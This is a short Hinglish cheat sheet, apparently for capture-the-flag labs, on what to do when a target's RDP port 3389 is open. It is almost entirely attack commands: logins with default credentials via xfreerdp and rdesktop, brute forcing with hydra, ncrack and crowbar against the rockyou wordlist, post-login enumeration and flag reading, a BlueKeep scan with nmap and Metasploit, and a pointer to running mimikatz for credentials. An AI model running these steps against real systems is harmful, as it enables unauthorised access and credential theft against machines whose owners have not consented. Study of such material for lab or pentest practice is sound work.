# 🔓 RDP PORT OPEN (3389) — Ab Kya?

---

## CASE 1: Default/Known Creds Try Karo
```bash
xfreerdp /v:<IP> /u:admin /p:password
xfreerdp /v:<IP> /u:administrator /p:admin
rdesktop <IP> -u admin -p password123
```

---

## CASE 2: Brute Force RDP
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> rdp -t 4
ncrack -vv -u admin -P /usr/share/wordlists/rockyou.txt <IP>:3389
crowbar -b rdp -s <IP>/32 -u admin -C /usr/share/wordlists/rockyou.txt
```
> ⚠️ RDP slow hai — `-t 4` se zyada mat karo, lockout ho sakta hai

---

## CASE 3: Login Hua — Post Exploit Windows
```bash
# RDP session mein:
# CMD open karo:
whoami
hostname
ipconfig
net user
type C:\Users\Administrator\Desktop\flag.txt
type C:\flag.txt
dir /s /b C:\*flag*
```

---

## CASE 4: BlueKeep (CVE-2019-0708) Check
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 <IP>
# Metasploit:
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP>
run
```

---

## CASE 5: RDP + Mimikatz (creds already mila)
```bash
xfreerdp /v:<IP> /u:admin /p:<cracked_pass>
# Andar jaake mimikatz chala sakte ho agar admin ho
```

---

## QUICK DECISION:
```
RDP open
  ├─ Default creds → xfreerdp
  ├─ Brute force → hydra/ncrack (slow, -t 4)
  ├─ Login hua → whoami, type flag.txt
  ├─ BlueKeep? → CVE-2019-0708 check
  └─ Creds kisi aur se mile? → Reuse on RDP
```
